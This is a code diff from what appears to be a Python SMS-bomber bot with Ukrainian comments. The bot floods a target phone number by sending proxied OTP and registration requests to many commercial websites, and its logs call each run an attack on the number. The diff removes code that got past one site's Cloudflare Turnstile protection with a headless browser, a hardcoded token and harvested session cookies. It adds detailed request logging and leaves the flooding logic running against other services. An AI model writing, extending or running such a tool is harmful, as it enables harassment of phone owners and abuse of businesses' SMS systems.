@@ -22,7 +22,7 @@ from headers_main import (
     headers_uvape, cookies_uvape, headers_terravape, cookies_terravape,
     headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
     headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
-    cookies_elmir_call, headers_smaki, cookies_smaki
+    cookies_elmir_call
 )
 import asyncpg
 import config
@@ -252,19 +252,7 @@ async def get_turnstile_token(proxy_url=None, proxy_auth=None):
                 user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             )
             
-            # Додаємо cookies
-            for key, value in cookies_smaki.items():
-                await context.add_cookies([{
-                    "name": key,
-                    "value": value,
-                    "domain": "smaki-maki.com",
-                    "path": "/"
-                }])
-            
             page = await context.new_page()
-            
-            # Відкриваємо сторінку
-            await page.goto("https://smaki-maki.com/", wait_until="networkidle", timeout=30000)
             
             # Чекаємо поки Turnstile завантажиться та отримає токен
             try:
@@ -1361,25 +1349,6 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         return
 
     logging.info(f"Отримано CSRF-токен: {csrf_token}")
-    
-    # Отримуємо OCSESSID cookie для smaki-maki
-    smaki_session_id = None
-    try:
-        timeout = aiohttp.ClientTimeout(total=5)
-        async with aiohttp.ClientSession(timeout=timeout, cookies=cookies_smaki) as session:
-            async with session.get("https://smaki-maki.com/", headers=headers_smaki, proxy=proxy_url, proxy_auth=proxy_auth) as resp:
-                if resp.status == 200:
-                    cookies_from_resp = resp.cookies
-                    if 'OCSESSID' in cookies_from_resp:
-                        smaki_session_id = cookies_from_resp['OCSESSID'].value
-                        logging.info(f"Отримано OCSESSID для smaki-maki: {smaki_session_id[:10]}...")
-    except Exception as e:
-        logging.error(f"Помилка отримання OCSESSID: {e}")
-    
-    # Оновлюємо cookies для smaki-maki з отриманим OCSESSID
-    smaki_cookies_final = cookies_smaki.copy()
-    if smaki_session_id:
-        smaki_cookies_final['OCSESSID'] = smaki_session_id
 
     formatted_number = f"+{number[:2]} {number[2:5]} {number[5:8]} {number[8:10]} {number[10:]}"
     formatted_number2 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:10]}+{number[10:]}"
@@ -1393,19 +1362,22 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
     logging.info(f"Запуск атаки на номер {number}")
 
     async def send_request_and_log(url, **kwargs):
+        method = kwargs.get('method', 'POST')
+        start_time = asyncio.get_event_loop().time()
+        
         try:
             if not attack_flags.get(chat_id):
                 return
             
-            # Для smaki-maki використовуємо більший таймаут (30 секунд)
-            timeout_seconds = 30 if 'smaki-maki.com' in url else 5
-            timeout = aiohttp.ClientTimeout(total=timeout_seconds)
+            timeout = aiohttp.ClientTimeout(total=5)
             
-            # Логування для smaki-maki перед запитом
-            if 'smaki-maki.com' in url:
-                logging.info(f"smaki-maki: починаю запит до {url}")
-                logging.info(f"smaki-maki: cookies = {kwargs.get('cookies', {})}")
-                logging.info(f"smaki-maki: data = {kwargs.get('data', {})}")
+            # Детальне логування перед запитом
+            domain = url.split('/')[2] if '/' in url else url
+            logging.info(f"[REQUEST] {method} {domain} | URL: {url[:100]}...")
+            if kwargs.get('data'):
+                logging.debug(f"[REQUEST DATA] {domain}: {str(kwargs['data'])[:200]}...")
+            if kwargs.get('json'):
+                logging.debug(f"[REQUEST JSON] {domain}: {str(kwargs['json'])[:200]}...")
             
             async with aiohttp.ClientSession(timeout=timeout) as session:
                 method = kwargs.pop('method', 'POST')
@@ -1417,42 +1389,38 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
                     pass
                 kwargs['headers'] = hdrs
                 
-                if 'smaki-maki.com' in url:
-                    logging.info(f"smaki-maki: виконую {method} запит...")
-                
                 async with session.request(method, url, **kwargs) as response:
-                    # Спеціальне логування для smaki-maki
-                    if 'smaki-maki.com' in url:
-                        logging.info(f"smaki-maki: отримано відповідь, статус {response.status}")
-                        try:
-                            response_text = await response.text()
-                            logging.info(f"smaki-maki відповідь (статус {response.status}): {response_text[:500]}")
-                            if response.status == 200:
-                                logging.info(f"Успіх - {number} (smaki-maki)")
-                        except Exception as e:
-                            logging.error(f"smaki-maki: помилка читання відповіді: {e}")
-                        return  # Не логуємо звичайний успіх для smaki-maki тут
+                    elapsed_time = asyncio.get_event_loop().time() - start_time
                     
+                    try:
+                        response_text = await response.text()
+                        response_preview = response_text[:500] if len(response_text) > 500 else response_text
+                    except Exception as e:
+                        response_preview = f"[Не вдалося прочитати відповідь: {e}]"
+                    
+                    # Детальне логування успішного запиту
                     if response.status == 200:
-                        logging.info(f"Успіх - {number}")
-                    elif 'smaki-maki.com' in url:
-                        logging.warning(f"smaki-maki повернув статус {response.status}")
+                        logging.info(f"[SUCCESS] {domain} | Статус: {response.status} | Час: {elapsed_time:.2f}s | Номер: {number}")
+                        logging.debug(f"[RESPONSE] {domain} | Відповідь: {response_preview}")
+                    # Детальне логування неуспішного запиту
+                    else:
+                        logging.warning(f"[FAILED] {domain} | Статус: {response.status} | Час: {elapsed_time:.2f}s | Номер: {number}")
+                        logging.debug(f"[RESPONSE] {domain} | Статус: {response.status} | Відповідь: {response_preview}")
+                        
         except asyncio.TimeoutError:
-            if 'smaki-maki.com' in url:
-                logging.error(f"Таймаут при запиті до {url} після {timeout_seconds} секунд")
-                logging.error("smaki-maki: можливі причини - сервер не відповідає, Cloudflare блокує, або потрібен cf-turnstile-response токен")
-            else:
-                logging.error(f"Таймаут при запиті до {url}")
+            elapsed_time = asyncio.get_event_loop().time() - start_time
+            domain = url.split('/')[2] if '/' in url else url
+            logging.error(f"[TIMEOUT] {domain} | Час: {elapsed_time:.2f}s | URL: {url[:100]}... | Номер: {number}")
+            
         except aiohttp.ClientError as e:
-            if 'smaki-maki.com' in url:
-                logging.error(f"smaki-maki: помилка підключення до {url}: {e}")
-            else:
-                logging.error(f"Помилка підключення до {url}: {e}")
+            elapsed_time = asyncio.get_event_loop().time() - start_time
+            domain = url.split('/')[2] if '/' in url else url
+            logging.error(f"[CLIENT_ERROR] {domain} | Час: {elapsed_time:.2f}s | Помилка: {str(e)} | URL: {url[:100]}... | Номер: {number}")
+            
         except Exception as e:
-            if 'smaki-maki.com' in url:
-                logging.error(f"smaki-maki: невідома помилка при запиті до {url}: {e}")
-            else:
-                logging.error(f"Невідома помилка при запиті до {url}: {e}")
+            elapsed_time = asyncio.get_event_loop().time() - start_time
+            domain = url.split('/')[2] if '/' in url else url
+            logging.error(f"[ERROR] {domain} | Час: {elapsed_time:.2f}s | Помилка: {str(e)} | Тип: {type(e).__name__} | URL: {url[:100]}... | Номер: {number}")
 
     semaphore = asyncio.Semaphore(3)  # Зменшено до 3 одночасних запитів
 
@@ -1548,72 +1516,11 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers})),
     ]
     
-    # Отримуємо Cloudflare Turnstile токен для smaki-maki
-    logging.info("Спроба отримати Turnstile токен автоматично...")
-    cf_turnstile_token = await get_turnstile_token(proxy_url=proxy_url, proxy_auth=proxy_auth)
-    
-    # Якщо автоматичне отримання не вдалося, використовуємо статичний токен як fallback
-    if not cf_turnstile_token:
-        logging.warning("Автоматичне отримання токену не вдалося, використовується статичний токен")
-        cf_turnstile_token = "0.xm5dnZ1yqhSNP_6pLtyn11ImtH8O5GwAC9-7UFirY-YXuXmkQJqZtnSBddBIR9WIgVMNNronsaOLiGgt1cZKrkr1ultCgFvvY-_kJ_L4-LX0s5YQSY5IJKYxQ5PqZYvjNqWuETy-Ll-izf4N8yADWbIfyfQiJkw3H2hMZS9tKX65uiNuU3Z_48JAOJMyToYD2CPnGm6-aYtM_tH8KBq4UNE96YULm5uqiZekyc5AWUHSelKFWick824JhQ8ijeboKSWrg8qgA5Wb1x-C6Ut0Psdg1ZwtOw5oE2FzkAF90BhEvXKgm1txa9iXUbECf4r1vsyhGu7536bLcGRm3_zmd2Oqq4SlbRzLyPxEwE3oxKvGGiWlv5sAr2hVeGz2rFygySqwCVkETo2Eh7gjtq8I_btGLNX-mJm3MqMLwqGjLJZi9J3DH0QTGP-LBTxV044PUj3yNGHt5UPmm-fjbVMhPUH1ueTDMrSU3Ili2n290LvABS3O7M5CUaxmFXkLTP7QlvCfVUYtxzXCPS1E-_3xRM58wpkRDBAAKUGqv000kPTfUbdLlLmOIYU_ma0dKDW4k7K0LAT9LYgmlKKiHQ_Ab040gniS5Ycgr8bRbZlOasnBtc1HGNb0BshMW7cL5WeuvJTRIiCgLyt4HCRn2zaSWJE4wBNTd8L-_pxeprXNKXggPPDO9srZ6VD9Simc3fEIRTWfTVbY9v4Jwlw6XdTKdRX9mLw_MKbDDOIZG4ty7pn15SXaGWfvcXziDNoaxZdlWsGH4k7cgfjDxMykb-sk1uo-kBU8LaWN11tyyXbwFvMWsjbiVid5RZSRgXgpnatm5YnzZ8hScpW4CtZX8AluQrZrnTVPXzeAEz_vUgXZUgPHRW0Cy-xikDmhCyD0CpyF.RUn_YLMaZW7AtthUofAmYA.8b55bca70f8975270a359d382c6a6129948f0955f302c6dc54b28a58b6363d44"
-    
-    # Додаємо smaki-maki: перший запит в початок, другий в кінець
-    smaki_first = None
-    smaki_second = None
-    if smaki_session_id:
-        # Генеруємо випадкове ім'я з англійських букв (5-10 символів) для першого запиту
-        random_name_length = random.randint(5, 10)
-        random_name = ''.join(random.choices(string.ascii_letters, k=random_name_length))
-        logging.info(f"Додаю перший запит до smaki-maki з OCSESSID: {smaki_session_id[:10]}... та номером: {formatted_number2}, ім'я: {random_name}")
-        smaki_first = bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true", "cf-turnstile-response": cf_turnstile_token}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
-        
-        # Генеруємо випадкове ім'я для другого запиту
-        random_name_length2 = random.randint(5, 10)
-        random_name2 = ''.join(random.choices(string.ascii_letters, k=random_name_length2))
-        logging.info(f"Додаю другий запит до smaki-maki з OCSESSID: {smaki_session_id[:10]}... та номером: {formatted_number2}, ім'я: {random_name2}")
-        smaki_second = bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name2, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true", "cf-turnstile-response": cf_turnstile_token}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
-    else:
-        logging.warning("smaki-maki: не вдалося отримати OCSESSID, пропускаю запит")
-    
     # Формуємо першу пачку (всі перші запити)
-    first_batch = list(first_requests)  # Копіюємо список
-    if smaki_first:
-        first_batch.insert(0, smaki_first)
+    first_batch = list(first_requests)
     
-    # Формуємо другу пачку (всі другі запити) - оновлюємо OCSESSID перед другою пачкою
-    second_batch = list(second_requests)  # Копіюємо список
-    
-    # Оновлюємо OCSESSID для другого запиту smaki-maki перед другою пачкою
-    if smaki_second and smaki_session_id:
-        # Отримуємо новий OCSESSID для другого запиту
-        try:
-            timeout = aiohttp.ClientTimeout(total=5)
-            async with aiohttp.ClientSession(timeout=timeout, cookies=cookies_smaki) as session:
-                async with session.get("https://smaki-maki.com/", headers=headers_smaki, proxy=proxy_url, proxy_auth=proxy_auth) as resp:
-                    if resp.status == 200:
-                        cookies_from_resp = resp.cookies
-                        if 'OCSESSID' in cookies_from_resp:
-                            new_smaki_session_id = cookies_from_resp['OCSESSID'].value
-                            logging.info(f"Оновлено OCSESSID для другого запиту smaki-maki: {new_smaki_session_id[:10]}...")
-                            # Оновлюємо cookies у другому запиті
-                            new_smaki_cookies = smaki_cookies_final.copy()
-                            new_smaki_cookies['OCSESSID'] = new_smaki_session_id
-                            # Оновлюємо другий запит з новими cookies та токеном
-                            # Отримуємо новий токен для другого запиту
-                            logging.info("Отримую новий Turnstile токен для другого запиту...")
-                            new_cf_turnstile_token = await get_turnstile_token(proxy_url=proxy_url, proxy_auth=proxy_auth)
-                            if not new_cf_turnstile_token:
-                                new_cf_turnstile_token = cf_turnstile_token  # Використовуємо старий якщо новий не отримано
-                            
-                            # Перестворюємо smaki_second з новими cookies та токеном
-                            random_name_length2 = random.randint(5, 10)
-                            random_name2 = ''.join(random.choices(string.ascii_letters, k=random_name_length2))
-                            smaki_second = bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": random_name2, "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true", "cf-turnstile-response": new_cf_turnstile_token}, "headers": headers_smaki, "cookies": new_smaki_cookies}))
-        except Exception as e:
-            logging.error(f"Помилка оновлення OCSESSID для другого запиту: {e}")
-    
-    if smaki_second:
-        second_batch.append(smaki_second)
+    # Формуємо другу пачку (всі другі запити)
+    second_batch = list(second_requests)
 
     if not attack_flags.get(chat_id):
         return
